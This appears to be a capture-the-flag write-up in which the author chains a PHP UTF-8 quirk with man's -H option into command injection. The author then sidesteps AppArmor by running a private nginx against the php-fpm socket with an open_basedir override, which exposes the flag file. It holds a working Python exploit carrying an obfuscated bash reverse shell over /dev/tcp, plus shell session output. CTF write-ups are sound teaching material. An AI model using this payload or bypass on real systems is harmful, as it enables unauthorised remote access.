UTF-8 handling in PHP is [weird](https://gist.github.com/doc-smith/83f686e331fe172bf0f414adf26f483a).
Combined with the `-H` option of `man`, this gets us a reverse shell for free:
```python
import base64
import requests

REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts libz.so | cut -d" " -f1`/31337 0>&1'
SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'

MAAS_HOST = '127.0.0.1'
URL = f'http://{MAAS_HOST}:8820/'

requests.get(URL, params={
	'page': CGI_READY_REV_SHELL,
})
```

At this point, if we knew the name of the flag file, we could just `cat` it. Unfortunately, we don't:
  1. We know the flag is stored in `/`, but its basename is 24 random characters, which is unguessable.
  1. We can't get the basename from a directory listing either, since `/** mrixwlk` AppArmor policy, which `/usr/bin/man` is confined to, basically allows us to list files in any directory *except* the root one.

php-fpm, though, is not confined to any AppArmor policy. Even better, our reverse shell is running as `www-data` and we can talk to PHP via a UNIX socket (`/run/php/php7.3-fpm.sock`).

Let's trick PHP into revealing the contents of `/`! PHP (php-fpm) speaks [FastCGI](http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html), which seems moderately annoying to implement.
In order to avoid that, we spin up another instance of `nginx` with a custom config pointed at `/tmp/evil`.

```
www-data@2e75d56e6d85:/tmp/evil$ cat nginx.conf
pid /tmp/evil/evil.pid;
events {}

error_log /tmp/evil/err.evil;

http {
    access_log /tmp/evil/acc.evil;
    server {
            listen 127.0.0.1:31337 default_server;
            root /tmp/evil;
            server_name _;
            location ~ \.php$ {
                    include /etc/nginx/fastcgi.conf;
                    fastcgi_param PHP_VALUE open_basedir=/;
                    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            }
    }
}
```

The `fastcgi_param PHP_VALUE open_basedir=/` bypass is crucial for this to work.
If we omit it, php-fpm refuses to run scripts from `/tmp/evil` because its `open_basedir=` is set to `/var/www/html` in `www.conf`.

When we run `nginx` with this config, it complains that the error log is missing (I didn't find a way to make this warning go away), but runs anyway:
```
www-data@2e75d56e6d85:/tmp/evil$ /usr/sbin/nginx -c /tmp/evil/nginx.conf
nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (6: No such device or address)
www-data@2e75d56e6d85:/tmp/evil$ cat evil.pid
1045
```

Now all we need is a script that is going to be run by `php-fpm`:
```
www-data@2e75d56e6d85:/tmp/evil$ cat evil.php
<?php foreach (glob("/flag*") as $fn) echo "$fn\n"; ?>
```

And another one to orchestrate everything and finally get the flag:
```
www-data@2e75d56e6d85:/tmp/evil$ cat fetch_evil.php
<?php echo(file_get_contents("http://127.0.0.1:31337/evil.php")); ?>
www-data@2e75d56e6d85:/tmp/evil$ php -f fetch_evil.php
/flag_kLExDVGQxbiIfwStYMFhT4xF.txt
www-data@2e75d56e6d85:/tmp/evil$ cat /flag_kLExDVGQxbiIfwStYMFhT4xF.txt
hxp{maybe_this_will_finally_get_me_that_sweet_VC_money$$$}
```